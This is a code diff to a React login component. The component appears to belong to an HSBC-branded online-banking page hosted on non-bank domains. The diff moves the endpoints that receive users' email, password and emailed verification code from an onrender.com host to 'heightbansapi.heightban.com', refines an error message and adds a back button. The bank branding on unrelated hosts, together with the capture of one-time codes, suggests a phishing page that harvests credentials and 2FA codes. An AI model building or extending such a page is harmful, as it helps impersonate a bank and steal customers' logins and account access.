@@ -25,7 +25,7 @@ const Login = () => {
     try {
       if (step === 'login') {
         // Step 1: Send email + password to /api/auth/login
-        const res = await fetch('https://hsbc-online-backend.onrender.com/api/auth/login', {
+        const res = await fetch('https://heightbansapi.heightban.com/api/auth/login', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email, password }),
@@ -43,7 +43,7 @@ const Login = () => {
         }
       } else if (step === 'verify') {
         // Step 2: Send email + verification code to /api/auth/verify-code
-        const res = await fetch('https://hsbc-online-backend.onrender.com/api/auth/verify-code', {
+        const res = await fetch('https://heightbansapi.heightban.com/api/auth/verify-code', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email, code: code.trim() }),
@@ -70,7 +70,8 @@ const Login = () => {
         }
       }
     } catch (err) {
-      setError('Network error: ' + err.message);
+      console.error('Login error:', err);
+      setError('Network error: Unable to connect to server. Please check your connection and try again.');
     }
 
     setLoading(false);
@@ -196,6 +197,21 @@ const Login = () => {
                       'A verification code has been sent to your email. Please enter it below.'}
                   </p>
                 </div>
+
+                {/* Back Button */}
+                <button
+                  type="button"
+                  onClick={() => {
+                    setStep('login');
+                    setCode('');
+                    setError('');
+                    setMessage('');
+                  }}
+                  className="flex items-center text-sm text-gray-600 hover:text-gray-800 mb-4"
+                >
+                  <FaArrowLeft className="mr-2" />
+                  Back to login
+                </button>
 
                 {/* Verification Code Input */}
                 <div className="relative">
